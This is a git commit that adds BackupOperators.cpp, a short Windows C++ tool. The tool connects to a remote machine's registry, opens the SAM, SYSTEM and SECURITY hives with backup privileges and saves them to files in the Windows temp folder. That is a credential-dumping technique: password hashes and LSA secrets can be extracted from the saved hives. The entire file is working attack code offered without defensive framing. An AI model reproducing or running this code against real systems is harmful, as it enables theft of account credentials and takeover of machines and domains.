0eed806b9c16d837e3f53fd59045508a0fe3923f
Filip Dragovic <44291883+Wh04m1001@users.noreply.github.com>
2021-12-09 01:35:40 +0100

    Create BackupOperators.cpp

---
+++ BackupOperators.cpp
@@ -0,0 +1,31 @@
+#include <stdio.h>
+#include <Windows.h>
+
+int main()
+{
+    HKEY hklm;
+    HKEY hkey;
+    DWORD result;
+    const char* hives[] = { "SAM","SYSTEM","SECURITY" };
+    const char* files[] = { "C:\\windows\\temp\\sam.hive","C:\\windows\\temp\\system.hive","C:\\windows\\temp\\security.hive" };
+    
+    result = RegConnectRegistryA("\\\\<computername>", HKEY_LOCAL_MACHINE,&hklm);
+    if (result != 0) {
+        printf("RegConnectRegistryW: %d\n", result);
+        exit(0);
+    }
+    for (int i = 0; i < 3; i++) {
+
+        printf("Dumping %s hive to %s\n", hives[i], files[i]);
+        result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
+        if (result != 0) {
+            printf("RegOpenKeyExA: %d\n", result);
+            exit(0);
+        }
+        result = RegSaveKeyA(hkey, files[i], NULL);
+        if (result != 0) {
+            printf("RegSaveKeyA: %d\n", result);
+            exit(0);
+        }
+    }
+}
